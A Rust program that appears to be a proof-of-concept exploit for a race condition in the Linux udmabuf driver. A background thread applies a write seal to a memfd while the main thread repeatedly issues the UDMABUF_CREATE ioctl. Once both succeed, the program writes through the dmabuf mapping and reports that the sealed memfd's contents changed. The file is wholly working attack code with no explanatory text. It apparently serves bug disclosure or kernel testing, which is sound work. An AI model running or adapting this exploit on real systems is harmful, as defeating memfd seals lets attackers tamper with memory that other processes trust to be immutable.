use std::sync::atomic::Ordering::Relaxed;
use std::sync::atomic::{AtomicBool, AtomicI32, AtomicUsize};
use std::{ptr, thread};
use uapi::c::{
    ioctl, mmap, F_SEAL_SHRINK, F_SEAL_WRITE, MAP_FAILED, MAP_SHARED, MFD_ALLOW_SEALING, O_RDONLY,
    PROT_READ, PROT_WRITE,
};
use uapi::{fcntl_get_seals, open, OwnedFd, _IOW};

const INIT: usize = 0;
const CREATE_MEMFD: usize = 1;
const SEAL_MEMFD: usize = 2;

static STATE: AtomicUsize = AtomicUsize::new(INIT);

static MEMFD: AtomicI32 = AtomicI32::new(-1);
static SEAL_SUCCEEDED: AtomicBool = AtomicBool::new(false);

const PAGE_SIZE: usize = 4096;

fn main() {
    thread::spawn(|| {
        loop {
            while STATE.load(Relaxed) == INIT {
                // nothing
            }
            let memfd = uapi::memfd_create("memfd", MFD_ALLOW_SEALING).unwrap();
            uapi::ftruncate(memfd.raw(), PAGE_SIZE as _).unwrap();
            uapi::fcntl_add_seals(memfd.raw(), F_SEAL_SHRINK).unwrap();
            MEMFD.store(memfd.raw(), Relaxed);
            while STATE.load(Relaxed) == CREATE_MEMFD {
                // nothing
            }
            let res = uapi::fcntl_add_seals(memfd.raw(), F_SEAL_WRITE).is_ok();
            SEAL_SUCCEEDED.store(res, Relaxed);
            while STATE.load(Relaxed) == SEAL_MEMFD {
                // nothing
            }
            SEAL_SUCCEEDED.store(false, Relaxed);
            MEMFD.store(-1, Relaxed);
        }
    });

    let udmabuf = open("/dev/udmabuf", O_RDONLY, 0).unwrap();

    let mut memfd;
    let mut dmabuf;
    let mut attempt = 0;
    loop {
        attempt += 1;
        STATE.store(CREATE_MEMFD, Relaxed);
        loop {
            memfd = MEMFD.load(Relaxed);
            if memfd != -1 {
                break;
            }
        }
        let mut cmd = udmabuf_create {
            memfd: memfd as _,
            flags: 0,
            offset: 0,
            size: PAGE_SIZE as _,
        };
        STATE.store(SEAL_MEMFD, Relaxed);
        dmabuf = unsafe { ioctl(udmabuf.raw(), UDMABUF_CREATE, &mut cmd) };
        if dmabuf == -1 {
            eprintln!("create failed");
        } else if !SEAL_SUCCEEDED.load(Relaxed) {
            let _ = OwnedFd::new(dmabuf);
            eprintln!("seal failed");
        } else {
            eprintln!("succeeded after {attempt} tries");
            break;
        }
        STATE.store(INIT, Relaxed);
        while MEMFD.load(Relaxed) != -1 {
            // nothing
        }
    }

    let seals = fcntl_get_seals(memfd).unwrap();
    eprintln!("seals: {:b}", seals);
    assert_eq!(seals & F_SEAL_WRITE, F_SEAL_WRITE);
    unsafe {
        let memfd_mapping = mmap(ptr::null_mut(), PAGE_SIZE, PROT_READ, MAP_SHARED, memfd, 0);
        assert_ne!(memfd_mapping, MAP_FAILED);
        let memfd_b = memfd_mapping as *mut u8;

        let dmabuf_mapping = mmap(
            ptr::null_mut(),
            PAGE_SIZE,
            PROT_WRITE | PROT_READ,
            MAP_SHARED,
            dmabuf,
            0,
        );
        assert_ne!(dmabuf_mapping, MAP_FAILED);
        let dmabuf_b = dmabuf_mapping as *mut u8;

        let old_memfd_b = *memfd_b;
        *dmabuf_b = 1;
        let new_memfd_b = *memfd_b;

        eprintln!("memfd byte changed from {} to {}", old_memfd_b, new_memfd_b);
    }
}

#[allow(non_camel_case_types)]
#[repr(C)]
struct udmabuf_create {
    memfd: u32,
    flags: u32,
    offset: u64,
    size: u64,
}

const UDMABUF_CREATE: u64 = _IOW::<udmabuf_create>(b'u' as u64, 0x42);
